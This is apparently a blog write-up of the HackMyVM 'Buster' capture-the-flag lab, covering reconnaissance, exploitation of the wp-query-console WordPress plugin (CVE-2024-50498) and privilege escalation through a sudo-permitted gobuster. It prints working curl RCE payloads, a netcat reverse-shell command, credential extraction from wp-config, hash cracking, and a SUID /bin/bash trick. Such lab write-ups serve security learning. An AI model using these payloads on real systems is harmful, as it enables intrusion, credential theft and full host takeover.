+++
title = "HackMyVM Buster Write-Up"
date = 2025-02-23
description = "Walkthrough of the Buster machine from HackMyVM, featuring WordPress plugin exploitation and privilege escalation via custom binary injection."
slug = "buster-hackmyvm-ctf-write-up"
authors = ["David"]
tags = ["CTF", "HackMyVM", "Linux", "WordPress", "Privilege Escalation", "RCE"]
categories = ["Write-ups", "CTF"]
externalLink = ""
series = []
+++

**Buster** is an interesting easy-difficulty Linux machine on the HMV platform, which involves the following sceneries and techniques:

*   Web reconnaissance
*   Wordpress enumeration with WPScan
*   Plugin exploitation (Unauthenticated Remote Code Execution)
*   Hash Cracking
*   Lateral movement
*   Privilege escalation via SUID binary injection

## Enumeration

1.  Hosts discovery by using ARP-SCAN tool:

    ```bash
    arp-scan -I eth0 --localnet --ignoredups
    ```

    ![ARP Scan](/images/posts/buster-hackmyvm-ctf-write-up/one.png)

2.  Once we’ve identified which is the target machine IP address, let’s run some ping requests to get the operating system that is currently being used by taking a look at the TTL (Time To Live) value:

    ```bash
    ping -c 3 192.168.100.122
    ```

    ![Ping TTL](/images/posts/buster-hackmyvm-ctf-write-up/two.png)

3.  Let’s use Nmap to discover open TCP ports and get more information regarding to the operation system and kernel version:

    ```bash
    nmap -p- --open --min-rate 4000 -O --osscan-guess -n -vv -sT -Pn 192.168.100.122
    ```

    ![Nmap Scan](/images/posts/buster-hackmyvm-ctf-write-up/four.png)

4.  Services and versions scan with Nmap:

    ```bash
    nmap -sCV -p22,80 -n -Pn 192.168.100.122
    ```

    ![Service Scan](/images/posts/buster-hackmyvm-ctf-write-up/five.png)

    As we can see in the previous scan results, a WordPress application is running on a nginx server, this is relevant information for further steps.

5.  Extracting information about the target web server running on port 80:

    ```bash
    whatweb http://192.168.100.122
    ```

    ![WhatWeb](/images/posts/buster-hackmyvm-ctf-write-up/six.png)

    With this results, we confirm the WordPress and nginx version. To reconfirm it once more we can use Wappalyzer web extension.

6.  Since a WordPress application was detected running on port 80, using wpscan tool to identify potential users and active plugins will be the best step to follow:

    ```bash
    wpscan --url http://192.168.100.122 -e u,ap --plugins-detection aggressive
    ```

    ![WPScan](/images/posts/buster-hackmyvm-ctf-write-up/seven.png)

    Great finding!
    *   Valid WordPress users: “ta0” and “welcome“
    *   After running the scan, we’ve been able to discover three active plugins. The last one is so interesting, let’s go to the browser and see what information or related exploit we can find.

    **CVE-2024-50498**
    [View more](https://www.wordfence.com/threat-intel/vulnerabilities/wordpress-plugins/wp-query-console/wp-query-console-10-unauthenticated-remote-code-execution)

    Notice that the previous scan took around 20 minutes, it’s pretty exhaustive compared to the following nmap script scan:

    ```bash
    nmap --script http-wordpress-enum --script-args "http-wordpress-enum.search-limit=500" -n -Pn 192.168.100.122
    ```

    ![Nmap Script](/images/posts/buster-hackmyvm-ctf-write-up/eight.png)

    As you can see it just detected the akismet plugin.

## Exploitation

Taking a look at the previous finding, there’s a critical vulnerability that leads to Remote Code Execution associated with the **wp-query-console** plugin (version 1.0).

7.  It’s time to look for a PoC (Proof of Concept) or exploit related to the found vulnerability to understand how it works and how we could effectively exploit it:
    [Github PoC](https://github.com/RandomRobbieBF/CVE-2024-50498)

    So, based on the previous PoC, we have to run a POST request specifying the following information:
    *   Endpoint: `/wp-json/wqc/v1/query`
    *   Content-Type: `application/json`
    *   Data: `{"queryArgs":"phpinfo();","queryType":"post"}`

    ```bash
    curl -X POST http://192.168.100.122/wp-json/wqc/v1/query -H "Content-Type: application/json" -d '{"queryArgs":"phpinfo();","queryType":"post"}'
    ```

    ![PHP Info](/images/posts/buster-hackmyvm-ctf-write-up/ten.png)

    The previous command “phpinfo();” will display detailed information about the PHP configuration of the target server. We’ll be using this command to confirm if RCE is happening on the server side and also to filter information about the PHP functions that have been disable for security purposes and see if there’s an available function to execute commands:

    ```bash
    curl -X POST http://192.168.100.122/wp-json/wqc/v1/query -H "Content-Type: application/json" -d '{"queryArgs":"phpinfo();","queryType":"post"}' | html2text | grep -i disable_functions
    ```

    ![Disable Functions](/images/posts/buster-hackmyvm-ctf-write-up/twelve.png)

    As we can see, exec and system are disabled, however, there’s one function that allow us to execute commands and is apparently available:
    *   `shell_exec()`

8.  Sending a some ICMP requests with ping utility from the target machine to our threat actor machine to :
    *   Start capturing ICMP traffic from the threat actor machine:

    ```bash
    tcpdump icmp
    ```

    ![Tcpdump](/images/posts/buster-hackmyvm-ctf-write-up/thirteen.png)

    *   Execute the ping requests from the target machine:

    ```bash
    curl -X POST http://192.168.100.122/wp-json/wqc/v1/query -H "Content-Type: application/json" -d '{"queryArgs":"shell_exec(\"ping -c 3 192.168.100.104\");","queryType":"post"}'
    ```

    ![Ping Request](/images/posts/buster-hackmyvm-ctf-write-up/fourteen.png)

    It’s definitely working, we’re executing commands at system level. Sending a reverse shell to our threat actor will be the next step:
    *   Starting a listener with Netcat:

    ```bash
    nc -nvlp 443
    ```

    *   Sending a reverse shell from the target machine:

    ```bash
    curl -X POST http://192.168.100.122/wp-json/wqc/v1/query -H "Content-Type: application/json" -d '{\"queryArgs\":\"shell_exec(\\\"nc -e /bin/bash 192.168.100.104 443\\\");\",\"queryType\":\"post\"}'
    ```

    ![Reverse Shell](/images/posts/buster-hackmyvm-ctf-write-up/fifteen.png)

## Privilege escalation

We’re currently as `www-data` user, so in order to escalate privileges let’s perform some system enumeration:

*   Get OS version and kernel information:

    ```bash
    uname -a && lsb_release -a
    ```

    ![OS Info](/images/posts/buster-hackmyvm-ctf-write-up/sixteen.png)

    For now this kernel version doesn’t represent the right way to escalate privileges..

*   Enumerating users via `/etc/passwd` file:
    It seems that the WordPress user that has been previously found is also a valid user on the system, with a `/bin/sh` assigned.

*   Taking a look at the WordPress configuration file `wp-config.php`:

    ![WP Config](/images/posts/buster-hackmyvm-ctf-write-up/seventeen.png)

9.  Using the found credentials to connect to the MySQL service, running internally on port 3306:

    ```bash
    mysql -u ll104567 -h localhost -p
    ```

    ![MySQL Login](/images/posts/buster-hackmyvm-ctf-write-up/eighteen.png)

    The credentials are valid for the database service.

*   Available databases:
*   Accessing to WordPress users table (`wp_users`):

    ![DB Users](/images/posts/buster-hackmyvm-ctf-write-up/nineteen.png)

    Since we’re sure that “welcome” is a valid user on the system let’s extract this hash and put it into a file to identify the hashing algorithm and attempt to crack it:

*   By using `hash-identifier`, we were able to detect that the hashing algorithm of the hash is MD5, time to perform hash cracking with `john` tool:

    ```bash
    john --wordlist=/usr/share/wordlists/rockyou.txt hash_welcome
    ```

    ![John Crack](/images/posts/buster-hackmyvm-ctf-write-up/twenty.png)

    There’s a valid password up there!

10. We are officially logged as `welcome` user so let’s start checking if we have any special permissions on the SUDOERS file by executing the following command:

    ```bash
    sudo -l
    ```

    ![Sudo List](/images/posts/buster-hackmyvm-ctf-write-up/twenty-one.png)

    This is quite unusual—we can execute the Gobuster binary as any existing user on the system.
    By itself, it doesn’t represent a via to escalate privileges, nevertheless, let’s enumerate the system processes with PSPY utility.

*   It seems that root user is running this hidden binary, let’s check on the file permissions to know how to move forward:

    ![Process List](/images/posts/buster-hackmyvm-ctf-write-up/twenty-two.png)

### Lateral thinking

¿How the hell could we take advantage on this scenery to escalate privileges and get root access?
At this point, we know the following:

*   We can run gobuster binary as root user
*   There’s a system process where a custom binary is executed by root user

10. Since Gobuster includes a parameter that allows saving (writing) fuzzing output to a specified file, we can exploit this functionality by injecting the path of a custom binary into the output file “`/opt/.test.sh`“. Ultimately, root user will be executing this, in consequence allowing us to gain privileged access on the system.

*   Creating the custom binary to assign SUID permission to the “`/bin/bash`“:

    ```bash
    chmod u+s /bin/bash
    ```

    We’re logged as welcome user currently so let’s locate this file in the following directory where we clearly have writing permission:
    `/home/welcome/.privesc`

    Do not forget to assign execution permissions to the binary.

*   From the threat actor machine, let’s re create the previous directory, sub directories and file structure, the idea is intentionally make this route be found for Gobuster from the target machine later.
    Right over here, let’s set up a basic web server to host the created scenery:

    ```bash
    python3 -m http.server 80
    ```

    ![Python Server](/images/posts/buster-hackmyvm-ctf-write-up/twenty-three.png)

11. From the target machine, the next step is to create a custom wordlist that point to the created resource on attacker machine’s side:

    ```bash
    /home/welcome/.privesc
    ```

    `/home/welcome/wordlist.txt`

*   Time to perform some brute force with gobuster against our python web server hosted on the threat actor machine:

    ```bash
    gobuster http://192.168.100.104 -w /home/welcome/wordlist.txt
    ```

    ![Gobuster](/images/posts/buster-hackmyvm-ctf-write-up/twenty-four.png)

*   From the python web server we confirm what we just saw in the previous picture, the path is successfully found

12. Everything is going exactly as we expected, so, in order to perform the command injection on “`/opt/.test.sh`“, let’s execute:

    ```bash
    sudo -u root gobuster http://192.168.100.104 -w /home/welcome/wordlist.txt -n -q -o /opt/.test.sh
    ```

    ![Exploit Exec](/images/posts/buster-hackmyvm-ctf-write-up/twenty-five.png)

    *   `-n` : Don’t display errors
    *   `-q` : Don’t print the banner and other noise
    *   `-o` : Output file to write results to..

    By doing this, the binary’s path will be injected into the `/opt/.test.sh` file due to the configuration of `wordlist.txt`. Since the URI exists on the Python server, Gobuster’s output will be subsequently injected into `/opt/.test.sh`. Finally, when root executes `/opt/.test.sh`, it will run our custom binary, modifying `/bin/bash` permissions.

    ```bash
    bash -p
    ```

    ![Root Shell](/images/posts/buster-hackmyvm-ctf-write-up/twenty-six.png)

    Root user has been pwned.

    I have created the following diagram to illustrate how the privilege escalation works:

    ![PrivEsc Diagram](/images/posts/buster-hackmyvm-ctf-write-up/buster-diagram.png)
